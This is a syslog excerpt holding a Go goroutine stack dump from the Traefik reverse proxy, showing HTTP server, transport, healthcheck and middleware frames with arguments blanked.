jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4456757 [runnable]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447669 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).waitforcontinue.func1( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1803 +
jun 29 15:17:29 [localhost] traefik: net/http.(*request).write( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/request.go:609 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1825 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 3764101 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4456644 [select, 1 minutes]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4359753 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461231 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447668 [runnable]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1237 +
jun 29 15:17:29 [localhost] traefik: goroutine 4391610 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:764 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1855 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 1257015 [select]:
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/healthcheck.(*healthcheck).execute( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/healthcheck/healthcheck.go:110 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/healthcheck.(*healthcheck).setbackendsconfiguration.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/healthcheck/healthcheck.go:99 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/safe.gowithrecover.func1( , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:142 +
jun 29 15:17:29 [localhost] traefik: created by github.com/containous/traefik/safe.gowithrecover
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/safe/routine.go:136 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461228 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445627 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:2033 +
jun 29 15:17:29 [localhost] traefik: net/http.(*transport).roundtrip( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:422 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.errorhandlingroundtripper.roundtrip( , , , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:150 +
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:193 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*httpforwarder).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:493 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward.(*forwarder).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/forward/fwd.go:263 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp.func1( )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:26 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavebackend( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:56 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savebackend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_backend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp.func1()
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:25 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.servesavefrontend( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:50 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*savefrontend).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/save_frontend.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin.(*roundrobin).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/vulcand/oxy/roundrobin/rr.go:129 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*emptybackendhandler).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/empty_backend_handler.go:29 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.(*handlerswitcher).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/handlerswitcher.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.wrap.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:41 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/thoas/stats.(*stats).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/thoas/stats/stats.go:64 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares/accesslog.(*loghandler).servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/accesslog/logger.go:160 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(middleware).servehttp-fm( , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: net/http.handlerfunc.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1947 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/middlewares.negronirecoverhandler.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/middlewares/recover.go:23 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.handlerfunc.servehttp( , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:24 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.middleware.servehttp( , , , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:33 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/urfave/negroni.(*negroni).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/urfave/negroni/negroni.go:81 +
jun 29 15:17:29 [localhost] traefik: github.com/containous/traefik/vendor/github.com/containous/mux.(*router).servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /go/src/github.com/containous/traefik/vendor/github.com/containous/mux/mux.go:133 +
jun 29 15:17:29 [localhost] traefik: net/http.serverhandler.servehttp( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2694 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1830 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461068 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.setrequestcancel.func3( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:323 +
jun 29 15:17:29 [localhost] traefik: created by net/http.setrequestcancel
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/client.go:322 +
jun 29 15:17:29 [localhost] traefik: goroutine 4447396 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4453050 [runnable]:
jun 29 15:17:29 [localhost] traefik: bufio.newwritersize(...)
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:543
jun 29 15:17:29 [localhost] traefik: net/http.newbufiowritersize( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:826 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).readrequest( , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1014 +
jun 29 15:17:29 [localhost] traefik: net/http.(*conn).serve( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:1768 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*server).serve
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:2795 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461274 [runnable]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461195 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).backgroundread( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:668 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*connreader).startbackgroundread
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:664 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461236 [select]:
jun 29 15:17:29 [localhost] traefik: net/http/httputil.(*reverseproxy).servehttp.func1( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:154 +
jun 29 15:17:29 [localhost] traefik: created by net/http/httputil.(*reverseproxy).servehttp
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/httputil/reverseproxy.go:153 +
jun 29 15:17:29 [localhost] traefik: goroutine 4454856 [select]:
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).writeloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1822 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*transport).dialconn
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1238 +
jun 29 15:17:29 [localhost] traefik: goroutine 4461271 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*connreader).backgroundread( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:668 +
jun 29 15:17:29 [localhost] traefik: created by net/http.(*connreader).startbackgroundread
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/server.go:664 +
jun 29 15:17:29 [localhost] traefik: goroutine 4445558 [io wait]:
jun 29 15:17:29 [localhost] traefik: internal/poll.runtime_pollwait( , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/runtime/netpoll.go:173 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).wait( , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:85 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*polldesc).waitread( , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_poll_runtime.go:90 +
jun 29 15:17:29 [localhost] traefik: internal/poll.(*fd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/internal/poll/fd_unix.go:157 +
jun 29 15:17:29 [localhost] traefik: net.(*netfd).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/fd_unix.go:202 +
jun 29 15:17:29 [localhost] traefik: net.(*conn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/net.go:176 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).read( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1453 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).fill( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:100 +
jun 29 15:17:29 [localhost] traefik: bufio.(*reader).peek( , , , , , , )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/bufio/bufio.go:132 +
jun 29 15:17:29 [localhost] traefik: net/http.(*persistconn).readloop( )
jun 29 15:17:29 [localhost] traefik: /usr/local/go/src/net/http/transport.go:1601 +
